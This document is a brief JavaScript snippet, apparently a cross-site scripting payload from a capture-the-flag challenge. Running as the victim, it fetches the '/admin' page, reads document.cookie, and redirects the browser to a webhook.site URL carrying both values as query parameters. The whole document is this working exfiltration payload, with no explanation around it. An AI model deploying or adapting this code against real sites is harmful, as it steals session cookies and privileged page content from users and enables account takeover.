async function sendFlagToWebhook(webhookUrl) {
  try {
    const response = await fetch('/admin');
    const data = await response.text();
    console.log(data);

    const encodedData = encodeURIComponent(data);
    const cookie = document.cookie;
    const encodedcookie = encodeURIComponent(cookie);
    const urlWithQueryParams = `${webhookUrl}?data=${encodedData}&cookies=${cookie}`;

    document.location = urlWithQueryParams;
  } catch (error) {
    console.error('Error:', error);
  }
}

sendFlagToWebhook('https://webhook.site/c9b6fcf2-a309-457b-b6f2-08d9b8d42e39');
